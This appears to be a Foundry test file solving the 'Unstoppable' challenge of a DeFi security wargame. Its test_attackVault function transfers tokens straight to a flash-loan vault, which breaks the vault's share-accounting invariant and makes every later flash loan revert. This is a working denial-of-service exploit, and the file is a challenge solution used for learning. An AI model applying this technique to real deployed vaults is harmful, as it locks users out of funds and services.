// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.19;

import { Test, console } from "forge-std/Test.sol";
import { ReceiverUnstoppable } from "../src/ReceiverUnstoppable.sol";
import { UnstoppableVault } from "../src/UnstoppableVault.sol";
import { SafeTransferLib, ERC4626, ERC20 } from "@solmate/src/mixins/ERC4626.sol";

contract UnstoppableTest is Test {

    uint256 TOKENS_IN_VAULT = 1000000e18; //18 Decimals
    uint256 INITIAL_PLAYER_BALANCE = 10e18; //player begins with 10 tokens

    address public admin = makeAddr("Admin");
    address public user = makeAddr("Hacker");

    MockERC20 dvt;
    UnstoppableVault vault;
    ReceiverUnstoppable receiverContract;

    function setUp() external {
        vm.startPrank(admin);

        dvt = new MockERC20(TOKENS_IN_VAULT); 
        vault = new UnstoppableVault(
            ERC20(dvt),
            admin,
            admin
        );

        dvt.approve(address(vault), TOKENS_IN_VAULT);
        vault.deposit(TOKENS_IN_VAULT, admin);
        dvt.mint(user, INITIAL_PLAYER_BALANCE);

        vm.stopPrank();
    }

    function test_basicSetup() public {

        assertEq(address(vault.asset()), address(dvt));
        assertEq(dvt.balanceOf(address(vault)), TOKENS_IN_VAULT);
        assertEq(vault.totalAssets(), TOKENS_IN_VAULT);
        assertEq(vault.totalSupply(), TOKENS_IN_VAULT);
        assertEq(vault.maxFlashLoan(address(dvt)), TOKENS_IN_VAULT);
        assertEq(vault.flashFee(address(dvt), TOKENS_IN_VAULT - 1), 0);
        assertEq(vault.flashFee(address(dvt), TOKENS_IN_VAULT), 50000e18);
        assertEq(dvt.balanceOf(user), INITIAL_PLAYER_BALANCE);

    }

    function test_vaultWorking() public {
        vm.startPrank(user);
        receiverContract = new ReceiverUnstoppable(address(vault));
        receiverContract.executeFlashLoan(100e18);
        console.log(dvt.balanceOf(user));
        vm.stopPrank();
    }


    function test_attackVault() public {
        //increase total assets to be more than total supply
        //going to send it our tokens via NOT the deposit fucntion, Thus breakign the strict in equality

        vm.startPrank(user);
        dvt.transfer(address(vault), 5e18); //now the vault is broken!!
        receiverContract = new ReceiverUnstoppable(address(vault));
        vm.expectRevert();
        receiverContract.executeFlashLoan(100e18);
        vm.stopPrank();
    }
}


//Mock Token for scripting purposes
contract MockERC20 is ERC20{
    constructor(uint256 initialSupply)ERC20("DamnValuableToken", "DVT", 18){
        _mint(msg.sender, initialSupply);
    }

    function mint(address _receiver, uint256 _amount) external{
        _mint(_receiver, _amount);
    }
}